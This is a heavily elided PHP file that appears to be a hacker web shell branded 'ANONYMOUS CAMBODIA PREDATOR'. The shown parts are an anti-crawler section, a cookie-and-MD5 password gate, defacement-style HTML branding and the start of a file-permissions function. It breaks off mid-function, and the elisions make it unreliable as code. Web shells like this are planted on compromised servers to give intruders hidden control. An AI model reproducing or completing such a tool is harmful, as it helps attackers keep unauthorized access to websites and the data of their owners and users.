...
/*------------------ End of Anti Crawler -----*/
    ...
    echo "<link href=data:image/gif;https://i.ibb.co/vqHJy6m/20240523-232133.png rel=icon type=image/x-icon />";
    echo "<style>
    html { background:url(https://i.ibb.co/vqHJy6m/20240523-232133.png) black; }
    ...
    if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password))
    {
        ...
        else
        {
            ...
            echo '<title>ANONYMOUS CAMBODIA EDATOR</title><center>
            ...
            <tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>ANONYMOUS By CAMBODIA PREDATOR</b></font></th></tr>
...
<title>ANONYMOUS CAMBODIA PREDATOR</title>
<style>
body{
font-family: "Iceberg";
...
<center><img src="https://i.ibb.co/vqHJy6m/20240523-232133.png" width="500" height="300"></center>
<h1><center><b><font color="red" face="iceberg">-=[ ANONYMOUS </font><font color="white" face="iceberg"></font> <font color="white" face="iceberg">CAMBODIA PREDATOR]=-</font></b><br>
			</center></h1>
			<font face="iceberg">
...
echo '<br /><center><font color="white"></font><font color="red">CAMBODIA PREDATOR</font></center>
</BODY>
</HTML>';
function perms($file){
